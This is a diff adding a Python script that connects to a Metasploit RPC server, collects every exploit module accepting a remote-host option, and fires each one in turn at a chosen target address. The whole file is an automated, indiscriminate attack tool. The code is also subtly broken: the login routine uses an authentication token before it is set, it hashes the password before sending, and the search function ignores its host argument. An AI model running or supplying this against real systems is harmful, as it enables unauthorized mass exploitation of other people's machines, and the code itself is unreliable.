@@ -1,0 +1,47 @@
+#!/usr/bin/env python3
+# copyright
+import msgpack
+import hashlib
+import requests
+
+class MetasploitAPI:
+    def __init__(self, host, port, username, password):
+        self.url = f"http://{host}:{port}/api/"
+        self.auth_token = self.login(username, password)
+
+    def call(self, method, *args):
+        headers = {'Content-Type': 'binary/message-pack'}
+        payload = msgpack.packb([method, self.auth_token] + list(args))
+        response = requests.post(self.url, headers=headers, data=payload)
+        return msgpack.unpackb(response.content)
+
+    def login(self, username, password):
+        auth_args = [username, hashlib.md5(password.encode()).hexdigest()]
+        response = self.call('auth.login', *auth_args)
+        if response.get(b'result') == b'success':
+            return response[b'token']
+        else:
+            raise Exception("Authentication failed")
+
+    def search_exploits(self, host):
+        modules = self.call('module.exploits')
+        applicable_exploits = []
+        for exploit in modules[b'modules']:
+            info = self.call('module.info', 'exploit', exploit)
+            if b'rhosts' in info[b'options']:
+                applicable_exploits.append(exploit)
+        return applicable_exploits
+
+    def run_exploit(self, exploit, host):
+        exploit_options = {'RHOSTS': host}
+        self.call('module.execute', 'exploit', exploit, exploit_options)
+        print(f"Executed {exploit} on {host}")
+
+if __name__ == "__main__":
+    msf = MetasploitAPI('127.0.0.1', 55552, 'msf', 'password')  # Remplacez par vos paramètres
+    target_host = '192.168.1.100'  # Remplacez par l'hôte cible
+       
+    exploits = msf.search_exploits(target_host)
+    for exploit in exploits:
+        msf.run_exploit(exploit, target_host)
+
